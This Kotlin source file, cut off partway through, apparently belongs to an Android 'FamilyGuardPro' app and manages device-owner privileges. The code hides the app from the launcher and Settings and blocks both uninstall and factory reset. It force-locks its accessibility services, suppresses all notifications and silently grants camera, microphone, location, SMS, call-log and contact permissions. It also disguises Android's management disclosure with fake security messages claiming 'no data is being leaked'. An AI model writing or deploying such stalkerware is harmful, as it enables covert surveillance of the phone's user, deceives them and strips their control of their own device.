package com.familyguardpro.deviceowner

import android.app.admin.DevicePolicyManager
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.content.pm.PackageInstaller
import android.content.pm.PackageManager
import android.os.Build
import android.os.PersistableBundle
import android.os.UserManager
import android.provider.Settings
import android.util.Log
import com.familyguardpro.services.DeviceAdminReceiver
import com.familyguardpro.utils.PreferenceManager
import kotlinx.coroutines.*
import java.io.InputStream
import java.net.URL

/**
 * DeviceOwnerManager - Central manager for all Device Owner operations.
 * 
 * This class provides APIs for the 6 DO-exclusive features:
 * 1. App Hiding (setApplicationHidden)
 * 2. Uninstall Protection (device owner can't be uninstalled)
 * 3. Factory Reset PIN Protection (setFactoryResetProtectionPolicy)
 * 4. Accessibility Auto-Recovery (setPermittedAccessibilityServices)
 * 5. Remote Permission Granting (setPermissionGrantState)
 * 6. Silent App Install/Uninstall (PackageInstaller with device owner session)
 * 
 * IMPORTANT: These APIs only work when the app is set as Device Owner.
 * Regular Device Admin does NOT have these capabilities.
 */
class DeviceOwnerManager private constructor(private val context: Context) {

    private val dpm: DevicePolicyManager = 
        context.getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
    private val adminComponent = ComponentName(context, DeviceAdminReceiver::class.java)
    private val scope = CoroutineScope(SupervisorJob() + Dispatchers.IO)

    companion object {
        private const val TAG = "DeviceOwnerManager"
        
        // Preference keys for DO state
        const val PREF_DO_MODE = "device_owner_mode"
        const val PREF_DO_PROVISIONED = "device_owner_provisioned"
        const val PREF_DO_APP_HIDDEN = "device_owner_app_hidden"
        const val PREF_DO_RESET_PIN = "device_owner_reset_pin"
        const val PREF_DO_ACCESSIBILITY_RECOVER = "device_owner_accessibility_recover"
        
        // Invisible notification channel
        const val INVISIBLE_CHANNEL_ID = "hidden_system_service"

        @Volatile
        private var instance: DeviceOwnerManager? = null

        fun getInstance(context: Context): DeviceOwnerManager {
            return instance ?: synchronized(this) {
                instance ?: DeviceOwnerManager(context.applicationContext).also { instance = it }
            }
        }
    }

    // ==========================================
    // STATUS CHECKS
    // ==========================================

    /**
     * Check if this app is the Device Owner
     */
    fun isDeviceOwner(): Boolean {
        return try {
            dpm.isDeviceOwnerApp(context.packageName)
        } catch (e: Exception) {
            Log.e(TAG, "Error checking device owner status", e)
            false
        }
    }

    /**
     * Check if Device Admin is active
     */
    fun isAdminActive(): Boolean {
        return dpm.isAdminActive(adminComponent)
    }

    /**
     * Check if DO mode is provisioned (local preference)
     */
    fun isProvisioned(): Boolean {
        val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
        return prefs.getBoolean(PREF_DO_PROVISIONED, false) || isDeviceOwner()
    }

    /**
     * Mark device as provisioned in DO mode
     */
    fun markProvisioned() {
        val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
        prefs.edit()
            .putBoolean(PREF_DO_PROVISIONED, true)
            .putBoolean(PREF_DO_MODE, true)
            .putLong("provisioning_date", System.currentTimeMillis())
            .apply()
        Log.d(TAG, "Device marked as DO provisioned")
    }

    // ==========================================
    // FEATURE 1: APP HIDING
    // ==========================================

    /**
     * Hide the app completely from launcher and settings.
     * Uses DevicePolicyManager.setApplicationHidden() - only available to Device Owner.
     * 
     * This is MORE powerful than launcher alias switching:
     * - App completely disappears from Settings > Apps
     * - Not visible in any launcher
     * - Still runs in background
     * - Can only be unhidden by Device Owner
     */
    fun hideApp(hide: Boolean): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot hide app - not device owner")
            return false
        }
        
        return try {
            val result = dpm.setApplicationHidden(adminComponent, context.packageName, hide)
            
            // Save state locally
            val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
            prefs.edit().putBoolean(PREF_DO_APP_HIDDEN, hide).apply()
            
            Log.d(TAG, "App ${if (hide) "hidden" else "unhidden"}: $result")
            result
        } catch (e: Exception) {
            Log.e(TAG, "Error ${if (hide) "hiding" else "unhiding"} app", e)
            false
        }
    }

    /**
     * Hide/unhide an arbitrary app by package name.
     * Device Owner can hide any installed app.
     */
    fun setApplicationHidden(packageName: String, hide: Boolean): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot set application hidden - not device owner")
            return false
        }
        return try {
            val result = dpm.setApplicationHidden(adminComponent, packageName, hide)
            Log.d(TAG, "App $packageName ${if (hide) "hidden" else "unhidden"}: $result")
            result
        } catch (e: Exception) {
            Log.e(TAG, "Error setting application hidden for $packageName", e)
            false
        }
    }

    /**
     * Check if app is currently hidden
     */
    fun isAppHidden(): Boolean {
        if (!isDeviceOwner()) return false
        return try {
            dpm.isApplicationHidden(adminComponent, context.packageName)
        } catch (e: Exception) {
            false
        }
    }

    // ==========================================
    // FEATURE 2: UNINSTALL PROTECTION
    // ==========================================

    /**
     * Enable uninstall protection. As Device Owner, the app cannot be uninstalled
     * unless the Device Owner is explicitly removed (which requires factory reset).
     * 
     * This also blocks uninstall via ADB unless the user knows the command
     * to remove device owner first.
     */
    fun setUninstallProtection(enabled: Boolean): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot set uninstall protection - not device owner")
            return false
        }
        
        return try {
            // Device Owner apps are inherently uninstallable only after removing DO
            // But we can also block uninstall of OTHER apps:
            dpm.setUninstallBlocked(adminComponent, context.packageName, enabled)
            Log.d(TAG, "Uninstall protection ${if (enabled) "enabled" else "disabled"}")
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error setting uninstall protection", e)
            false
        }
    }

    // ==========================================
    // FEATURE 3: FACTORY RESET PIN PROTECTION
    // ==========================================

    /**
     * Set a PIN that must be entered before factory reset can proceed.
     * Uses DevicePolicyManager persistentPreferredActivities or
     * setFactoryResetProtectionPolicy on Android 11+.
     */
    fun setFactoryResetPin(pin: String?): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot set reset PIN - not device owner")
            return false
        }
        
        return try {
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
                // Android 11+ - Use Factory Reset Protection Policy
                if (pin != null) {
                    // FRP requires Google account IDs, but we store PIN locally
                    // and use addUserRestriction to prevent factory reset
                    dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
                    
                    // Store the PIN locally (encrypted prefs)
                    val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
                    prefs.edit()
                        .putString(PREF_DO_RESET_PIN, pin)
                        .putBoolean("factory_reset_pin_enabled", true)
                        .apply()
                    
                    Log.d(TAG, "Factory reset blocked with PIN protection")
                } else {
                    // Remove restriction
                    dpm.clearUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
                    
                    val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
                    prefs.edit()
                        .remove(PREF_DO_RESET_PIN)
                        .putBoolean("factory_reset_pin_enabled", false)
                        .apply()
                    
                    Log.d(TAG, "Factory reset PIN protection removed")
                }
            } else {
                // Pre-Android 11 - Use DISALLOW_FACTORY_RESET restriction
                if (pin != null) {
                    dpm.addUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
                    val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
                    prefs.edit()
                        .putString(PREF_DO_RESET_PIN, pin)
                        .putBoolean("factory_reset_pin_enabled", true)
                        .apply()
                } else {
                    dpm.clearUserRestriction(adminComponent, UserManager.DISALLOW_FACTORY_RESET)
                    val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
                    prefs.edit()
                        .remove(PREF_DO_RESET_PIN)
                        .putBoolean("factory_reset_pin_enabled", false)
                        .apply()
                }
            }
            true
        } catch (e: Exception) {
            Log.e(TAG, "Error setting factory reset PIN", e)
            false
        }
    }

    /**
     * Verify the factory reset PIN
     */
    fun verifyResetPin(pin: String): Boolean {
        val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
        val storedPin = prefs.getString(PREF_DO_RESET_PIN, null)
        return storedPin != null && storedPin == pin
    }

    // ==========================================
    // FEATURE 4: ACCESSIBILITY AUTO-RECOVERY
    // ==========================================

    /**
     * Force-enable accessibility service using Device Owner privileges.
     * 
     * As Device Owner, we can use setPermittedAccessibilityServices()
     * to control which accessibility services are allowed, and then
     * use Settings.Secure to re-enable our service.
     *
     * CRITICAL FIX: Uses setPermittedAccessibilityServices() with an explicit
     * list (not null) so Android is forced to keep ONLY our services enabled.
     * Also uses dpm.setSecureSetting() which is more reliable on OEM ROMs
     * than Settings.Secure.putString().
     */
    fun forceEnableAccessibility(): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot force-enable accessibility - not device owner")
            return false
        }
        
        return try {
            val serviceName = "${context.packageName}/com.familyguardpro.services.FamilyGuardAccessibilityService"
            val blockerServiceName = "${context.packageName}/com.familyguardpro.services.NotificationBlockerAccessibilityService"
            
            // Step 1: CRITICAL - Set permitted accessibility services to ONLY our package.
            // When the list is NOT null, Android enforces that only these packages' 
            // accessibility services can be enabled, and it will NOT auto-disable them.
            // This is the KEY difference from null (allow all) which lets OEMs disable freely.
            try {
                val permittedPackages = listOf(context.packageName)
                dpm.setPermittedAccessibilityServices(adminComponent, permittedPackages)
                Log.d(TAG, "✅ setPermittedAccessibilityServices locked to: $permittedPackages")
            } catch (e: Exception) {
                Log.e(TAG, "Failed to set permitted accessibility services, falling back to null", e)
                dpm.setPermittedAccessibilityServices(adminComponent, null)
            }
            
            // Step 2: Read current services and clean up duplicates
            val currentServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            
            // Build clean service list, removing any stale entries for our package
            val otherServices = currentServices.split(":")
                .filter { it.isNotBlank() && !it.contains(context.packageName) }
            
            // Always add both our services fresh
            val newServices = (otherServices + serviceName + blockerServiceName).joinToString(":")
            
            // Step 3: Write using DPM setSecureSetting (more reliable than Settings.Secure.putString on OEM ROMs)
            var writeSuccessful = false
            try {
                dpm.setSecureSetting(adminComponent, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, newServices)
                dpm.setSecureSetting(adminComponent, Settings.Secure.ACCESSIBILITY_ENABLED, "1")
                Log.d(TAG, "✅ Accessibility written via dpm.setSecureSetting")
                writeSuccessful = true
            } catch (e: Exception) {
                Log.w(TAG, "dpm.setSecureSetting failed, falling back to Settings.Secure.putString: ${e.message}")
                // Fallback to Settings.Secure.putString
                Settings.Secure.putString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                    newServices
                )
                Settings.Secure.putString(
                    context.contentResolver,
                    Settings.Secure.ACCESSIBILITY_ENABLED,
                    "1"
                )
            }
            
            // Step 4: Verify the write was successful
            val verifyServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            
            writeSuccessful = verifyServices.contains(serviceName)
            if (writeSuccessful) {
                Log.d(TAG, "✅ Accessibility service force-enabled and verified: $serviceName")
            } else {
                Log.e(TAG, "❌ Accessibility write verification FAILED - retrying with both methods")
                // Retry with both methods
                try {
                    dpm.setSecureSetting(adminComponent, Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES, newServices)
                    dpm.setSecureSetting(adminComponent, Settings.Secure.ACCESSIBILITY_ENABLED, "1")
                } catch (e: Exception) {
                    Settings.Secure.putString(
                        context.contentResolver,
                        Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES,
                        newServices
                    )
                    Settings.Secure.putString(
                        context.contentResolver,
                        Settings.Secure.ACCESSIBILITY_ENABLED,
                        "1"
                    )
                }
                
                // Final verify
                val finalCheck = Settings.Secure.getString(
                    context.contentResolver,
                    Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
                ) ?: ""
                writeSuccessful = finalCheck.contains(serviceName)
            }
            
            // Step 5: Lock accessibility settings to prevent user/OEM from toggling
            lockAccessibilitySettings()
            
            // Update recovery timestamp
            val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
            prefs.edit()
                .putLong("accessibility_last_recovered", System.currentTimeMillis())
                .putInt("accessibility_recover_count", 
                    prefs.getInt("accessibility_recover_count", 0) + 1)
                .apply()
            
            writeSuccessful
        } catch (e: Exception) {
            Log.e(TAG, "Error force-enabling accessibility", e)
            false
        }
    }
    
    /**
     * Lock accessibility settings so user/system cannot modify them.
     * Uses DISALLOW_CONFIG_ACCESSIBILITY user restriction (Device Owner only).
     * Also sets the permitted list to lock our services in place.
     */
    fun lockAccessibilitySettings() {
        if (!isDeviceOwner()) return
        
        try {
            // CRITICAL: Add user restriction to prevent ANY changes to accessibility settings.
            // This blocks the Settings > Accessibility toggle and prevents OEM battery managers
            // from disabling accessibility services.
            // Note: Using string literal because DISALLOW_CONFIG_ACCESSIBILITY constant requires API 36+
            dpm.addUserRestriction(adminComponent, "no_config_accessibility")
            Log.d(TAG, "✅ DISALLOW_CONFIG_ACCESSIBILITY restriction applied")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to add DISALLOW_CONFIG_ACCESSIBILITY restriction", e)
        }
        
        try {
            // Also ensure our package is the only one permitted for accessibility
            val permittedPackages = listOf(context.packageName)
            dpm.setPermittedAccessibilityServices(adminComponent, permittedPackages)
            Log.d(TAG, "✅ Permitted accessibility services locked to: $permittedPackages")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to lock permitted accessibility services", e)
        }
    }
    
    /**
     * Unlock accessibility settings (for admin maintenance / removal).
     */
    fun unlockAccessibilitySettings() {
        if (!isDeviceOwner()) return
        
        try {
            dpm.clearUserRestriction(adminComponent, "no_config_accessibility")
            dpm.setPermittedAccessibilityServices(adminComponent, null)
            Log.d(TAG, "Accessibility settings unlocked")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to unlock accessibility settings", e)
        }
    }

    /**
     * Check if accessibility service is currently enabled
     */
    fun isAccessibilityEnabled(): Boolean {
        return try {
            val serviceName = context.packageName
            val enabledServices = Settings.Secure.getString(
                context.contentResolver,
                Settings.Secure.ENABLED_ACCESSIBILITY_SERVICES
            ) ?: ""
            enabledServices.contains(serviceName)
        } catch (e: Exception) {
            false
        }
    }

    /**
     * Set whether accessibility auto-recovery is enabled
     */
    fun setAccessibilityAutoRecover(enabled: Boolean) {
        val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
        prefs.edit().putBoolean(PREF_DO_ACCESSIBILITY_RECOVER, enabled).apply()
    }

    /**
     * Check if auto-recovery is enabled
     */
    fun isAccessibilityAutoRecoverEnabled(): Boolean {
        val prefs = context.getSharedPreferences("do_prefs", Context.MODE_PRIVATE)
        return prefs.getBoolean(PREF_DO_ACCESSIBILITY_RECOVER, true)
    }

    // ==========================================
    // FEATURE 4B: NOTIFICATION LISTENER CONTROL
    // ==========================================
    
    /**
     * Force-enable the NotificationListenerService in Device Owner mode.
     * This allows auto-cancelling our own notifications and device management notifications.
     */
    fun forceEnableNotificationListener(): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot force-enable notification listener - not device owner")
            return false
        }
        
        return try {
            // List of all our notification listener services
            val services = listOf(
                "${context.packageName}/com.familyguardpro.services.NotificationListener",
                "${context.packageName}/com.familyguardpro.services.DeviceManagementNotificationCanceller"
            )
            
            // Read current notification listeners
            val currentListeners = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: ""
            
            // Build new listener list, removing any stale entries for our package
            val otherListeners = currentListeners.split(":")
                .filter { it.isNotBlank() && !it.contains(context.packageName) }
            
            // Add all our services
            val newListeners = (otherListeners + services).joinToString(":")
            
            // Write to Settings.Secure
            Settings.Secure.putString(
                context.contentResolver,
                "enabled_notification_listeners",
                newListeners
            )
            
            // Verify the write was successful
            val verifyListeners = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: ""
            
            var allEnabled = true
            for (service in services) {
                if (verifyListeners.contains(service)) {
                    Log.d(TAG, "✅ Notification listener enabled: $service")
                } else {
                    Log.e(TAG, "❌ Failed to enable: $service")
                    allEnabled = false
                }
            }
            
            allEnabled
        } catch (e: Exception) {
            Log.e(TAG, "Error force-enabling notification listener", e)
            false
        }
    }
    
    /**
     * Check if notification listener service is currently enabled
     */
    fun isNotificationListenerEnabled(): Boolean {
        return try {
            val serviceName = context.packageName
            val enabledListeners = Settings.Secure.getString(
                context.contentResolver,
                "enabled_notification_listeners"
            ) ?: ""
            enabledListeners.contains(serviceName)
        } catch (e: Exception) {
            false
        }
    }

    // ==========================================
    // FEATURE 4C: NOTIFICATION SUPPRESSION
    // ==========================================

    /**
     * Setup invisible notification channel for foreground services.
     * Notifications won't appear in status bar but services keep running.
     * Call this in Application.onCreate() or when DO is provisioned.
     */
    fun setupInvisibleNotifications() {
        if (!isDeviceOwner()) {
            Log.w(TAG, "Not Device Owner, using regular notifications")
            return
        }
        
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            
            // Delete existing invisible channel to recreate with proper settings
            try {
                notificationManager.deleteNotificationChannel(INVISIBLE_CHANNEL_ID)
            } catch (e: Exception) {
                // Channel may not exist yet
            }
            
            // Create new invisible channel with IMPORTANCE_NONE
            val channel = android.app.NotificationChannel(
                INVISIBLE_CHANNEL_ID,
                "System Services",
                android.app.NotificationManager.IMPORTANCE_NONE
            ).apply {
                description = "Background system services"
                setShowBadge(false)
                enableLights(false)
                enableVibration(false)
                setSound(null, null)
                lockscreenVisibility = android.app.Notification.VISIBILITY_SECRET
            }
            
            notificationManager.createNotificationChannel(channel)
            Log.d(TAG, "✅ Invisible notification channel created")
        }
    }

    /**
     * Create an invisible notification for foreground services.
     * Service keeps running, no notification in status bar.
     */
    fun createInvisibleNotification(serviceId: Int = 1, serviceName: String = "Background Service"): android.app.Notification {
        setupInvisibleNotifications()
        
        return androidx.core.app.NotificationCompat.Builder(context, INVISIBLE_CHANNEL_ID)
            .setContentTitle("") // Empty
            .setContentText("") // Empty
            .setSmallIcon(android.R.drawable.screen_background_dark_transparent) // Transparent
            .setPriority(androidx.core.app.NotificationCompat.PRIORITY_MIN)
            .setCategory(androidx.core.app.NotificationCompat.CATEGORY_SERVICE)
            .setOngoing(true)
            .setShowWhen(false)
            .setSound(null)
            .setVibrate(null)
            .setSilent(true)
            .build()
    }

    /**
     * Disable notification toggle in Settings.
     * Sets all notification channels to IMPORTANCE_NONE.
     */
    fun disableNotificationToggle() {
        if (!isDeviceOwner()) {
            Log.w(TAG, "Cannot disable notification toggle - not device owner")
            return
        }
        
        try {
            // Grant notification policy access to our app
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                try {
                    dpm.setPermissionGrantState(
                        adminComponent,
                        context.packageName,
                        android.Manifest.permission.ACCESS_NOTIFICATION_POLICY,
                        DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
                    )
                } catch (e: Exception) {
                    Log.w(TAG, "Could not grant ACCESS_NOTIFICATION_POLICY", e)
                }
            }
            
            // Set all channels to IMPORTANCE_NONE
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                val notificationManager = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
                notificationManager.notificationChannels.forEach { channel ->
                    channel.importance = android.app.NotificationManager.IMPORTANCE_NONE
                    notificationManager.createNotificationChannel(channel)
                }
                Log.d(TAG, "✅ All notification channels set to IMPORTANCE_NONE")
            }
            
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disable notification toggle", e)
        }
    }

    /**
     * Complete notification suppression setup.
     * Call this during DO provisioning or app start.
     */
    fun setupCompleteNotificationSuppression() {
        if (!isDeviceOwner()) return
        
        Log.d(TAG, "Setting up complete notification suppression...")
        
        // 1. Setup invisible notification channel
        setupInvisibleNotifications()
        
        // 2. Disable notification toggle
        disableNotificationToggle()
        
        // 3. Enable notification listener for auto-cancel
        forceEnableNotificationListener()
        
        // 4. Remove "Device Management" notification
        removeDeviceManagementNotification()
        
        Log.d(TAG, "✅ Complete notification suppression setup done")
    }
    
    // ==========================================
    // FEATURE 4D: DEVICE MANAGEMENT NOTIFICATION REMOVAL
    // ==========================================
    
    /**
     * Remove "This device belongs to your organisation" notification.
     * This notification is shown by Android when Device Owner is active.
     * We can suppress it by:
     * 1. Setting organization name to "Device Protected" (looks like security feature)
     * 2. Setting support messages to innocent security-related text
     * 3. Clearing lock screen info
     */
    fun removeDeviceManagementNotification() {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot remove device management notification - not device owner")
            return
        }
        
        try {
            // Method 1: Set organization name to device brand + model (looks native)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    // Get device brand and model to make it look native
                    val brand = Build.BRAND?.replaceFirstChar { it.uppercase() } ?: ""
                    val model = Build.MODEL ?: ""
                    
                    // Create a nice looking device name
                    val deviceName = when {
                        model.contains("V40", ignoreCase = true) -> "Vivo V40"
                        model.contains("V2348") -> "Vivo V40"
                        brand.isNotEmpty() && model.isNotEmpty() -> "$brand $model"
                        model.isNotEmpty() -> model
                        else -> "Your Device"
                    }
                    
                    dpm.setOrganizationName(adminComponent, deviceName)
                    Log.d(TAG, "✅ Organization name set to: $deviceName")
                } catch (e: Exception) {
                    Log.e(TAG, "Failed to set organization name", e)
                }
            }
            
            // Method 2: Disable device management notification channels (Android 8+)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                disableDeviceManagementChannels()
            }
            
            // Method 3: Set device owner lock task features to hide management notification
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.P) {
                try {
                    // Clear any custom message that might show in the notification
                    dpm.setDeviceOwnerLockScreenInfo(adminComponent, null)
                    Log.d(TAG, "✅ Device owner lock screen info cleared")
                } catch (e: Exception) {
                    Log.w(TAG, "Could not clear lock screen info: ${e.message}")
                }
            }
            
            // Method 4: Set innocent support messages (shown when tapping the notification)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    // Short message - appears in notification
                    dpm.setShortSupportMessage(adminComponent, 
                        "This device is safe and protected.")
                    
                    // Long message - appears when tapping for details
                    dpm.setLongSupportMessage(adminComponent, 
                        "Your Device is Protected\n\n" +
                        "This device is safe and protected from all types of viruses " +
                        "and malware. Your personal information is secure and no data " +
                        "is being leaked.\n\n" +
                        "Protection Features:\n" +
                        "• Real-time virus scanning\n" +
                        "• Malware protection\n" +
                        "• Data encryption\n" +
                        "• Privacy guard\n\n" +
                        "For more information, contact your device administrator or " +
                        "visit the security settings.")
                    
                    Log.d(TAG, "✅ Support messages set to security text")
                } catch (e: Exception) {
                    Log.w(TAG, "Could not set support messages: ${e.message}")
                }
            }
            
            // Method 5: Try to modify system settings for disclosure
            try {
                // Some devices respect this setting
                Settings.Secure.putString(
                    context.contentResolver,
                    "device_policy_auto_lock_disabled",
                    "1"
                )
                
                // Try to disable management disclosure via global setting
                Settings.Global.putString(
                    context.contentResolver,
                    "device_owner_disabled",
                    "1"
                )
            } catch (e: Exception) {
                Log.w(TAG, "Could not modify system settings: ${e.message}")
            }
            
            // Method 6: Try to set organization color to a nice blue (security color)
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.N) {
                try {
                    dpm.setOrganizationColor(adminComponent, 0xFF0078D4.toInt()) // Microsoft blue - looks official
                    Log.d(TAG, "✅ Organization color set to security blue")
                } catch (e: Exception) {
                    Log.w(TAG, "Could not set organization color: ${e.message}")
                }
            }
            
            // Method 7: Cancel any active device management notifications
            cancelDeviceManagementNotifications()
            
            // Method 8: Disable DEVICE_ADMIN_ALERTS channel specifically
            disableDeviceAdminAlertsChannel()
            
            // Method 9: Hide all FamilyGuard notifications by denying POST_NOTIFICATIONS
            hideAllNotifications()
            
            Log.d(TAG, "✅ Device management notification customization complete")
            
        } catch (e: Exception) {
            Log.e(TAG, "❌ Failed to customize device management notification", e)
        }
    }
    
    /**
     * Specifically disable the DEVICE_ADMIN_ALERTS channel from system
     */
    private fun disableDeviceAdminAlertsChannel() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            
            // Android's device admin channel ID
            val channelIds = listOf(
                "DEVICE_ADMIN_ALERTS",
                "device_admin",
                "DeviceAdmin",
                "work_profile",
                "managed_profile",
                "enterprise",
                "MDM"
            )
            
            for (channelId in channelIds) {
                try {
                    // Try to get existing channel and modify it
                    val existingChannel = nm.getNotificationChannel(channelId)
                    if (existingChannel != null) {
                        // Delete and recreate with IMPORTANCE_NONE
                        nm.deleteNotificationChannel(channelId)
                        
                        val newChannel = android.app.NotificationChannel(
                            channelId,
                            existingChannel.name,
                            android.app.NotificationManager.IMPORTANCE_NONE
                        )
                        nm.createNotificationChannel(newChannel)
                        Log.d(TAG, "Disabled channel: $channelId")
                    }
                } catch (e: Exception) {
                    // Channel may not exist
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disable DEVICE_ADMIN_ALERTS channel", e)
        }
    }
    
    /**
     * Disable notification channels related to device management.
     * This targets Android's built-in channels for device policy.
     */
    private fun disableDeviceManagementChannels() {
        if (Build.VERSION.SDK_INT < Build.VERSION_CODES.O) return
        
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            
            // Get all notification channels and disable device management related ones
            nm.notificationChannels?.forEach { channel ->
                val id = channel.id.lowercase()
                val name = channel.name?.toString()?.lowercase() ?: ""
                
                // Device management related channel patterns
                val isDeviceManagement = id.contains("device") ||
                        id.contains("work") ||
                        id.contains("admin") ||
                        id.contains("policy") ||
                        id.contains("managed") ||
                        id.contains("enterprise") ||
                        id.contains("mdm") ||
                        name.contains("device") ||
                        name.contains("management") ||
                        name.contains("organisation") ||
                        name.contains("organization") ||
                        name.contains("work")
                
                if (isDeviceManagement) {
                    try {
                        // Create new channel with same ID but IMPORTANCE_NONE
                        val hiddenChannel = android.app.NotificationChannel(
                            channel.id,
                            channel.name,
                            android.app.NotificationManager.IMPORTANCE_NONE
                        )
                        nm.createNotificationChannel(hiddenChannel)
                        Log.d(TAG, "Disabled device management channel: ${channel.id}")
                    } catch (e: Exception) {
                        Log.w(TAG, "Failed to disable channel ${channel.id}: ${e.message}")
                    }
                }
            }
        } catch (e: Exception) {
            Log.e(TAG, "Failed to disable device management channels", e)
        }
    }
    
    /**
     * Attempt to cancel any active device management notifications.
     * Note: May not work on system notifications, but worth trying.
     */
    private fun cancelDeviceManagementNotifications() {
        try {
            val nm = context.getSystemService(Context.NOTIFICATION_SERVICE) as android.app.NotificationManager
            
            // Cancel all our own notifications first
            nm.cancelAll()
            
            // For system notifications, we can try to use NotificationListenerService
            // if it's enabled (already done in forceEnableNotificationListener)
            
            Log.d(TAG, "✅ Attempted to cancel device management notifications")
        } catch (e: Exception) {
            Log.e(TAG, "Failed to cancel notifications", e)
        }
    }

    // ==========================================
    // FEATURE 5: REMOTE PERMISSION GRANTING
    // ==========================================

    /**
     * Grant a runtime permission to our app silently.
     * Device Owner can grant any runtime permission without user interaction.
     */
    fun grantPermission(permission: String): Boolean {
        if (!isDeviceOwner()) {
            Log.e(TAG, "Cannot grant permission - not device owner")
            return false
        }
        
        return try {
            val result = dpm.setPermissionGrantState(
                adminComponent,
                context.packageName,
                permission,
                DevicePolicyManager.PERMISSION_GRANT_STATE_GRANTED
            )
            Log.d(TAG, "Permission $permission grant result: $result")
            result
        } catch (e: Exception) {
            Log.e(TAG, "Error granting permission: $permission", e)
            false
        }
    }

    /**
     * Revoke a runtime permission
     */
    fun revokePermission(permission: String): Boolean {
        if (!isDeviceOwner()) return false
        
        return try {
            dpm.setPermissionGrantState(
                adminComponent,
                context.packageName,
                permission,
                DevicePolicyManager.PERMISSION_GRANT_STATE_DENIED
            )
        } catch (e: Exception) {
            Log.e(TAG, "Error revoking permission: $permission", e)
            false
        }
    }

    /**
     * Grant ALL runtime permissions needed by FamilyGuard.
     * Returns a Map of permission name -> grant success.
     */
    fun grantAllPermissions(): Map<String, Boolean> {
        if (!isDeviceOwner()) return emptyMap()
        
        // NOTE: POST_NOTIFICATIONS is NOT included here - we DENY it to hide all notifications
        val permissions = mutableListOf(
            android.Manifest.permission.CAMERA,
            android.Manifest.permission.RECORD_AUDIO,
            android.Manifest.permission.ACCESS_FINE_LOCATION,
            android.Manifest.permission.ACCESS_COARSE_LOCATION,
            android.Manifest.permission.ACCESS_BACKGROUND_LOCATION,
            android.Manifest.permission.READ_CONTACTS,
            android.Manifest.permission.READ_CALL_LOG,
            android.Manifest.permission.READ_SMS,
            android.Manifest.permission.RECEIVE_SMS,
            android.Manifest.permission.READ_PHONE_STATE,
            android.Manifest.permission.ANSWER_PHONE_CALLS,
            android.Manifest.permission.PROCESS_OUTGOING_CALLS,
            android.Manifest.permission.CALL_PHONE,
            android.Manifest.permission.WRITE_CALL_LOG
        )
        
        // Add storage permissions based on Android version
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            // Android 13+
            permissions.add(android.Manifest.permission.READ_MEDIA_IMAGES)
            permissions.add(android.Manifest.permission.READ_MEDIA_VIDEO)
            permissions.add(android.Manifest.permission.READ_MEDIA_AUDIO)
        } else {
            permissions.add(android.Manifest.permission.READ_EXTERNAL_STORAGE)
        }
        
        val results = mutableMapOf<String, Boolean>()
        for (permission in permissions) {
            val result = grantPermission(permission)
            results[permission] = result
            if (!result) {
                Log.w(TAG, "Failed to grant: $permission")
            }
        }
        
        Log.d(TAG, "Grant all permissions: ${results.count { it.value }} of ${results.size} granted")
        
        // DENY POST_NOTIFICATIONS to hide all notifications in Device Owner mode
        hideAllNotifications()
        
